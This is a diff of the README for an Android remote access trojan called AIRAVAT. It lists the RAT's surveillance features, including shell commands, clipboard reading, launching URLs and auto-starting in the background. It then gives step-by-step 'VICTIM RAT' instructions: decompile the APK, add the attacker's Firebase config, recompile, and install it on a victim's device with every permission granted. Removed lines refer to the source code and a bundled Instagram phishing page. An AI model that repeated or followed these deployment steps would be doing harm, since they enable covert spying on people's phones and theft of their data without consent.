@@ -6,10 +6,6 @@
 
 #### A multifunctional Android RAT with GUI based Web Panel without port forwarding.
 
-> [!IMPORTANT]
-> The source code has been published <a href="./ANDROID APP/AIRAVAT.swb" >here</a> use <a href="https://github.com/Sketchware-Pro/Sketchware-Pro" >Sketchware Pro</a> to view the source code.
-
-
 <div align="center">
 
 </div>
@@ -38,7 +34,7 @@
  - Run shell Commands
  - Get Clipboard text (Only When app's Activity is visible)
  - Launch Any URL (Only When app's Activity is visible)
- - Pre Binded with [Instagram Webview Phishing ](https://github.com/Th30neAnd0nly/PI)
+ 
  - Runs In Background 
     - Auto Starts on restarting the device
     - Auto Starts when any notification arrives
@@ -84,7 +80,7 @@
  1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/325ff0befec72a55c273e99a0e06059db9d599fb/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
  1. Save the file , Your Panel Setup is completed.
  ### VICTIM RAT
- 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
+ 1. Download Rat
  1. Decompile it using any Decompiler recommend above.
  1. Now open `res/values/strings.xml` file.
  1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
@@ -99,7 +95,7 @@
  1. Now compile the code with appt2.
  1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
   ### ONWER OF TEAM S-H-T 
-  Developer:- Sáíkø Bøy Røñy Ali 
+  Developer:- Sáíkø Bøy Røñy Ali &
    CONTACT US:- @rm7669
 
 
